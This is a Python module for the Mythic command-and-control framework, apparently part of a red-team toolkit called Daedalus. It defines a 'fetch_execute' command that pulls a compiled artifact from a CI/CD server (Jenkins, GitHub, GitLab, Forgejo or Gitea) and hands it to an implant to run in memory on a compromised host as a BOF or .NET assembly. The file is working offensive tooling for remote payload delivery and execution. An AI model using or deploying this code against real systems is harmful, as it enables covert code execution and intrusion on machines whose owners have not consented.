from __future__ import annotations

import json
import logging
import os
from pathlib import Path

from mythic_container.MythicCommandBase import (
    CommandBase,
    CommandAttributes,
    CommandParameter,
    ParameterType,
    PTTaskMessageAllData,
    PTTaskCreateTaskingMessageResponse,
    TaskArguments,
)
from mythic_container.MythicGoRPC import (
    SendMythicRPCCallbackSearch,
    SendMythicRPCFileCreate,
    SendMythicRPCResponseCreate,
    MythicRPCCallbackSearchMessage,
    MythicRPCFileCreateMessage,
    MythicRPCResponseCreateMessage,
)

from daedalus.providers import get_provider
from daedalus_ca.secrets import resolve_provider_kwargs

logger = logging.getLogger("daedalus_ca.fetch_execute")

_SUPPORT_FILE = Path(__file__).parent.parent / "agent_support.json"
_AGENT_SUPPORT: dict[str, dict] = {}


def _load_support() -> dict[str, dict]:
    global _AGENT_SUPPORT
    if not _AGENT_SUPPORT:
        entries = json.loads(_SUPPORT_FILE.read_text())
        _AGENT_SUPPORT = {e["agent"]: e for e in entries}
    return _AGENT_SUPPORT


_BINARY_EXTS = (".exe", ".dll", ".bin", ".o", ".so", ".elf", ".cpl", ".sys")
_SKIP_SUFFIXES = (".sha256", ".sha1", ".md5", ".sig", ".asc", ".json", ".txt", ".log")


def _select_artifact(artifacts: list[dict]) -> dict | None:
    binaries = [a for a in artifacts if any(a.get("relativePath", "").lower().endswith(e) for e in _BINARY_EXTS)]
    if binaries:
        return binaries[0]
    non_meta = [a for a in artifacts if not any(a.get("relativePath", "").lower().endswith(s) for s in _SKIP_SUFFIXES)]
    if non_meta:
        return non_meta[0]
    return artifacts[0] if artifacts else None


class FetchExecuteArguments(TaskArguments):
    def __init__(self, command_line: str, task_id: int = 0, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="provider",
                type=ParameterType.ChooseOneCustom,
                description="CI/CD provider to fetch artifacts from",
                choices=["jenkins", "github", "gitlab", "forgejo", "gitea"],
                default_value="jenkins",
            ),
            CommandParameter(
                name="job",
                type=ParameterType.String,
                description="Job/workflow name (e.g. loader-c-mingw, build.yml)",
            ),
            CommandParameter(
                name="build_id",
                type=ParameterType.String,
                description="Build number or run ID (e.g. lastSuccessfulBuild, latest)",
                default_value="lastSuccessfulBuild",
            ),
            CommandParameter(
                name="artifact_name",
                type=ParameterType.String,
                description="Specific artifact filename (auto-selects binary if empty)",
                default_value="",
            ),
            CommandParameter(
                name="tool_type",
                type=ParameterType.ChooseOne,
                description="Type of tool to execute in-memory",
                choices=["bof", "assembly"],
                default_value="bof",
            ),
            CommandParameter(
                name="bof_args",
                type=ParameterType.String,
                description="Arguments to pass to the BOF (packed format, optional)",
                default_value="",
            ),
            CommandParameter(
                name="assembly_args",
                type=ParameterType.String,
                description="Arguments to pass to the .NET assembly (space-separated)",
                default_value="",
            ),
            CommandParameter(
                name="jenkins_url", type=ParameterType.String, description="Jenkins server URL", default_value="",
            ),
            CommandParameter(
                name="jenkins_user", type=ParameterType.String, description="Jenkins username", default_value="",
            ),
            CommandParameter(
                name="jenkins_token", type=ParameterType.String, description="Jenkins API token", default_value="",
            ),
            CommandParameter(
                name="github_token", type=ParameterType.String, description="GitHub token", default_value="",
            ),
            CommandParameter(
                name="github_owner", type=ParameterType.String, description="GitHub repo owner", default_value="",
            ),
            CommandParameter(
                name="github_repo", type=ParameterType.String, description="GitHub repo name", default_value="",
            ),
            CommandParameter(
                name="gitlab_url", type=ParameterType.String, description="GitLab server URL", default_value="",
            ),
            CommandParameter(
                name="gitlab_token", type=ParameterType.String, description="GitLab token", default_value="",
            ),
            CommandParameter(
                name="gitlab_project_id", type=ParameterType.String, description="GitLab project ID", default_value="",
            ),
            CommandParameter(
                name="forgejo_url", type=ParameterType.String, description="Forgejo server URL", default_value="",
            ),
            CommandParameter(
                name="forgejo_token", type=ParameterType.String, description="Forgejo token", default_value="",
            ),
            CommandParameter(
                name="forgejo_owner", type=ParameterType.String, description="Forgejo repo owner", default_value="",
            ),
            CommandParameter(
                name="forgejo_repo", type=ParameterType.String, description="Forgejo repo name", default_value="",
            ),
            CommandParameter(
                name="gitea_url", type=ParameterType.String, description="Gitea server URL", default_value="",
            ),
            CommandParameter(
                name="gitea_token", type=ParameterType.String, description="Gitea token", default_value="",
            ),
            CommandParameter(
                name="gitea_owner", type=ParameterType.String, description="Gitea repo owner", default_value="",
            ),
            CommandParameter(
                name="gitea_repo", type=ParameterType.String, description="Gitea repo name", default_value="",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)

    async def parse_dictionary(self, dictionary: dict):
        self.load_args_from_dictionary(dictionary)


class FetchExecute(CommandBase):
    cmd = "fetch_execute"
    description = (
        "Fetch a CI/CD artifact from any supported provider (Jenkins, GitHub "
        "Actions, GitLab CI, Forgejo, Gitea) and execute it in-memory on the "
        "target callback. Supports BOFs and .NET assemblies."
    )
    help_cmd = "fetch_execute -provider jenkins -job loader-c-mingw -tool_type bof"
    author = "@Lavender-exe"
    version = 2
    script_only = True
    argument_class = FetchExecuteArguments
    attackmapping = ["T1105", "T1059"]
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        builtin=True,
        suggested_command=True,
        load_only=False,
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        try:
            provider_name = (taskData.args.get_arg("provider") or os.getenv("DAEDALUS_PROVIDER", "jenkins")).lower()
            job = taskData.args.get_arg("job")
            build_id = taskData.args.get_arg("build_id") or "lastSuccessfulBuild"
            artifact_name = taskData.args.get_arg("artifact_name") or ""
            tool_type = taskData.args.get_arg("tool_type") or "bof"
            bof_args = taskData.args.get_arg("bof_args") or ""
            assembly_args = taskData.args.get_arg("assembly_args") or ""

            if not job:
                raise ValueError("job is required")

            kwargs = resolve_provider_kwargs(taskData, provider_name)
            provider = get_provider(provider_name, **kwargs)

            if not artifact_name and hasattr(provider, "list_artifacts"):
                artifacts = await provider.list_artifacts(job, build_id)
                selected = _select_artifact(artifacts)
                if not selected:
                    raise ValueError(f"No artifacts found for {job} #{build_id}")
                artifact_name = selected["relativePath"]

            if not artifact_name:
                artifact_name = job

            logger.warning("Downloading %s/%s #%s/%s via %s", provider_name, job, build_id, artifact_name, provider_name)
            artifact_bytes = await provider.download_artifact(job, build_id, artifact_name)
            logger.warning("Downloaded %s (%d bytes)", artifact_name, len(artifact_bytes))

            file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                TaskID=taskData.Task.ID,
                FileContents=artifact_bytes,
                Filename=artifact_name,
                DeleteAfterFetch=True,
                Comment=f"Daedalus CA: fetched from {provider_name}/{job} #{build_id}",
            ))
            if not file_resp.success:
                raise RuntimeError(f"File upload failed: {file_resp.error}")

            agent_file_id = file_resp.agent_file_id
            logger.warning("Uploaded to Mythic: %s", agent_file_id)

            support = _load_support()
            callback_resp = await SendMythicRPCCallbackSearch(MythicRPCCallbackSearchMessage(
                CallbackID=taskData.Task.CallbackID,
            ))

            target_payload_type = taskData.payload_type
            if not target_payload_type and callback_resp.success and callback_resp.results:
                target_payload_type = getattr(callback_resp.results[0], "payload_type", "") or ""

            agent_cfg = support.get(target_payload_type, {})

            if tool_type == "bof":
                native_cmd = agent_cfg.get("bof_command", "execute_coff")
                file_param = agent_cfg.get("bof_file_parameter_name", "bof_file")
                params = {file_param: agent_file_id}
                if bof_args:
                    arg_param = agent_cfg.get("bof_argument_array_parameter_name", "arguments")
                    params[arg_param] = bof_args
            elif tool_type == "assembly":
                default_method = agent_cfg.get("assembly_default_execution_method", "execute_assembly")
                native_cmd = agent_cfg.get(f"{default_method}_command", "execute_assembly")
                file_param = agent_cfg.get(f"{default_method}_file_parameter_name", "assembly_file")
                params = {file_param: agent_file_id}
                if assembly_args:
                    arg_param = agent_cfg.get(f"{default_method}_argument_parameter_name", "assembly_arguments")
                    params[arg_param] = assembly_args
            else:
                raise ValueError(f"Unknown tool_type: {tool_type}")

            response.DisplayParams = f"[{tool_type}] {artifact_name} from {provider_name}/{job} #{build_id}"
            response.CommandName = native_cmd
            response.ReprocessAtNewCommandPayloadType = target_payload_type
            response.Params = json.dumps(params)

            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=(
                    f"Fetched {artifact_name} ({len(artifact_bytes)} bytes) from {provider_name}/{job} #{build_id}\n"
                    f"Delegating to {target_payload_type}/{native_cmd}"
                ).encode(),
            ))

        except Exception as e:
            logger.error("fetch_execute failed: %s", e, exc_info=True)
            response.Success = False
            response.Error = str(e)
            response.Completed = True

        return response
